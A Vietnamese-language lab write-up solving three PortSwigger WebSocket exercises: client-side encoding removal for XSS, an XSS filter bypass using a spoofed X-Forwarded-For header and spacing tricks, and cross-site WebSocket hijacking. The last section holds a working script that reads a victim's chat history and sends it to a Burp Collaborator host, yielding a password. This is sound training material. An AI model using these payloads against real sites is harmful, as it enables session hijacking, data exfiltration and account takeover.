# 1. Manipulating WebSocket messages to exploit vulnerabilities

Trong chức năng live chat, thử exploit XSS bằng cách gửi message `<img src=1 onerror=alert(1)>`, thì nhận thấy các kí tự đặc biệt đã bị HTML encoded, khiến chúng ta không thể exploit XSS. Sử dụng BurpRepeater, ta thấy dữ liệu gửi lên server cũng bị encode.

Trong file `chat.js` có đoạn code sau:

![image](https://user-images.githubusercontent.com/103978452/215007534-39c1a61f-0105-459e-82c2-8ee8d97ed5f9.png)
Như vậy website thực hiện encode phía client side rồi mới gửi đi, và chỉ encode nếu trong form có thuộc tính `encode=true`. Dùng Dev Tools xóa thuộc tính `encode` của thẻ form, sau đó gửi message `<img src=1 onerror=alert(1)>`, kết quả thành công.

# 2. Manipulating the WebSocket handshake to exploit vulnerabilities

Trong ứng dụng live chat, thử với đoạn tin nhắn `<img src=1 onerror=alert(1)`, kết quả website đã chặn truy cập do phát hiện XSS payload. Sử dụng BurpRepeater để gửi lại request thì thấy website trả về response `{"error":"Attack detected: Event handler"}`. Thử Reconnect thì có thông báo lỗi `"This address is blacklisted"`. Như vậy, website có XSS filter, sẽ kiểm tra XSS payload, nếu có thì sẽ chặn người dùng.

Thử thêm header `X-Forwarded-For: 1.1.1.1` thì thấy Reconnect thành công, như vậy ta có thể dùng header này để bypass. Sau khi thử nhiều payload thì ta nhận thấy:

+) Nếu xuất hiện `onerror=...` thì sẽ bị chặn, nhưng `onerror = ...` (thêm space ở giữa) thì lại thành công

+) Nếu xuất hiện `alert()` thì sẽ bị chặn với lỗi `{"error":"Attack detected: Alert"}`, tuy nhiên `alert ()` thì lại được cho phép.

Như vậy, ta cấu hình một message với nội dung sau:

```
{"message":"<img src=1 onerror = 'alert ()'>"}
```
Sau khi submit, kết quả bài lab được giải.

# 3. Cross-site WebSocket hijacking

Trong ứng dụng live chat, nhận thấy nếu gửi tin nhắn là READY thì response trả về sẽ gồm thông tin lịch sử tin nhắn. Như vậy ta có thể thực hiện tấn công CSRF để lấy lịch sử của người dùng khác.

Vào exploit server, cấu hình đoạn code sau:

```
<script>
const socket = new WebSocket('wss://0a0e002403df1318c0da7cdc008c004e.web-security-academy.net/chat');
socket.addEventListener('open', (event) => {
socket.send('READY');
});
socket.addEventListener('message', (event) => {
fetch('https://49bpw5gytci0xfweo3kysrdmddj37s.oastify.com?data='+encodeURIComponent(event.data));
});
</script>
```
Khi nạn nhân truy cập exploit web page, code trên sẽ gửi message `READY` tới `wss://0a0e002403df1318c0da7cdc008c004e.web-security-academy.net/chat`, rồi encode response trả về gửi đến Burp Collaborator. Vào Burp Collaborator Client kiểm tra, ta thấy có các request được gửi đến:

![image](https://user-images.githubusercontent.com/103978452/215761258-c8a9b443-51cd-4941-a3aa-992ffced533d.png)
Dựa vào các request đó, ta xác định được đoạn các messages gửi đi giữa user và bot Hal Pline như sau:

```
{"user":"Hal Pline","content":"Hello, how can I help?"}
{"user":"You","content":"I forgot my password"}
{"user":"Hal Pline","content":"No problem carlos, it's hoigo63yweck7xzwgbvz"}
{"user":"You","content":"Thanks, I hope this doesn't come back to bite me!"}
```

Thử đăng nhập với username=carlos, password=hoigo63yweck7xzwgbvz, kết quả thành công.
